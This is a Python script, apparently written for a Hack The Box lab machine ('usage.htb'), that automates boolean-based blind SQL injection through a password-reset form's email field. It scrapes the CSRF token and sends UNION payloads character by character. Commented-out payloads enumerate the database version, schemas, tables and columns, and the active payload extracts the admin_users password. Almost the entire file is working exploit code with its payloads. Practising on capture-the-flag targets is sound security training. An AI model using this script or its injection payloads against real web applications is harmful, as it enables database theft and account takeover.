'''
    for sending boolean based sqli attacks
    doesn't have much structure right now but im sure it'll get straightened out
'''
import requests
import string

s = requests.Session()
url = 'http://usage.htb/forget-password'
token = ''

def get_token():
    global token
    # get _token
    r = s.get(url)
    flag_start = '<input type="hidden" name="_token" value="'
    flag_stop = '">'
    token_start = r.text.find(flag_start) + len(flag_start)
    token_stop = r.text[token_start:].find(flag_stop) + token_start
    token = r.text[token_start:token_stop]
    print(f'{token=}')
    assert len(token), f':( {len(token)=}'
    return token

def try_thing(thing):
    # try query
    data = {
        'email': thing,   # sqli HERE, something like --> select * from table where email='{HERE}';
        '_token':token
    }
    r = s.post(url, data=data)

    #print(f'{r.status_code=}')
    #print(f'{r.headers=}')
    #print(f'{r.text=}')

    if 'We have e-mailed your password reset link to' in r.text: return 1
    elif 'Email address does not match in our records!' in r.text: return 0
    else: return -1

def loop_thing():
    # create list of chars
    uppers = string.ascii_uppercase
    lowers = string.ascii_lowercase
    special = string.punctuation.replace('`','').replace('"','').replace("'",'').replace(";",'').replace("%",'')
    numbers = '0123456789'
    all_chars = list(lowers + uppers + numbers + special)

    # iterate chars
    result = ''
    i = 0
    print('_', end='', flush=True)
    while True:
        if i == len(all_chars):
            print(f'\n{result=}')
            exit()
        char = all_chars[i]
        if (len(result) == 0 and char in '') or (len(result) == 6 and char in ''):
            i += 1
            continue
        print(f'\b{char}', end='', flush=True)
        # f"a' or (select version()) like '{result}{char}%'-- -"
        # f"a' union select schema_name,1,1,1,1,1,1,1 from information_schema.schemata where schema_name like '{result}{char}%'-- -"
        # f"a' union select table_name,1,1,1,1,1,1,1 from information_schema.tables where table_schema='usage_blog' and table_name like '{result}{char}%'-- -"
        # "a' union select column_name,1,1,1,1,1,1,1 from information_schema.columns where table_name='users' and column_name like '{result}{char}%'-- -"
        # "a' union select name,1,1,1,1,1,1,1 from users where id=1 and password like '{result}{char}%'-- -"
        test_str = f"a' union select name,1,1,1,1,1,1,1 from admin_users where id=1 and binary password like '{result}{char}%'-- -"
        #print(f'{test_str=}')
        r = try_thing(test_str)
        assert r != -1, 'err'
        if r == 1:
            result += char
            i = 0
            print(f'_', end='', flush=True)
        else:
            i += 1
        #print(f'{result=}')


if __name__=='__main__':

    get_token()
    loop_thing()